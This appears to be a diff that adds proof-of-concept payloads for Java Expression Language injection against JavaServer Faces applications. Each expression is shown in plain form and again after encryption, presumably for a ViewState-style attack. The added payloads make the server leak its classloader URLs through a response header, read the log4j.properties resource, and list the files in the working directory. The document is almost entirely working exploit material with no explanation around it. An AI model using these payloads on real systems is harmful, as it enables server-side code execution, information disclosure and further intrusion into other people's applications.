@@ -256,3 +256,18 @@ uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVJOD1h9UnMxZ++dPu
 
 payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"POC\", java.util.Arrays.toString(\"\".getClass().getClassLoader().getURLs()))}")
 uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVJOD1h9UnMxbrty1Q8kdF1NAQE/IVtCzU6+L3EAyJD7v68g4UUhVeNcjBOYGqxZf965L/VzcipcB7GiU2TWyQp/BQFmFYh/Kz3+T/ocF/hmn/fwGTCCCb/A==
+
+
+xxx
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"POC\", \"\".getClass().getClassLoader().toString())}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVJOD1h9UnMxZIkoWzQd/CtzmFrMHGC3FWulZTDDr2AQ/1/h+z6n6QyfnMtcKIh2tsu9nu41JzSLMNVauAqFOVcQ==
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"POC\", java.util.Arrays.toString(\"\".getClass().getClassLoader().getURLs()))}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVJOD1h9UnMxbrty1Q8kdF1NAQE/IVtCzU6+L3EAyJD7v68g4UUhVeNcjBOYGqxZf965L/VzcipcB7GiU2TWyQp/BQFmFYh/Kz3+T/ocF/hmn/fwGTCCCb/A==
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"POC\", new java.util.Scanner(\"\".getClass().getClassLoader().getResourceAsStream(\"log4j.properties\"), \"UTF-8\").useDelimiter(\"\\\\A\").next())}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVJOD1h9UnMxZ++dPucLN8v12PNuf6CJpZO2iZ8Dsc2itNeS1PUX/3aLtFmFJwkqBS3tnd4bibvfJ0ChZNV5GnCfQWSnlwdoYS71iR0Rx28203DuGLseyRlFiTufunxZfuO34sdafeDXoPEgd1kW7rpZZXFTafL8Vnu4GQE1gz022c/Dnw6hkIEyil1b0BA5UKfrhhRzKa5Ug=
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"POC\", java.util.Arrays.toString(\"\".getClass().forName(\"java.io.File\").getConstructor(\"\".getClass()).newInstance(System.getProperty(\"user.dir\")).list())))}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVJOD1h9UnMxbrty1Q8kdF1NAQE/IVtCzU6+L3EAyJD7v68g4UUhVeNcjBOYGqxZf9RbkalWJkapsN77q/Q8flJzTc9d1mQH0SzzXYO8suUZGCtaHm89JO3ZSdTaPFODuk+Kr/RnJKS+iAX0eHzb18Dj4lMoih8mrp/pIHfby+fyeO/eLjCz6FJGXJrTbrBLcKlcT3VuHf6eoexSfVQ0fdNA72OXNST6Ia
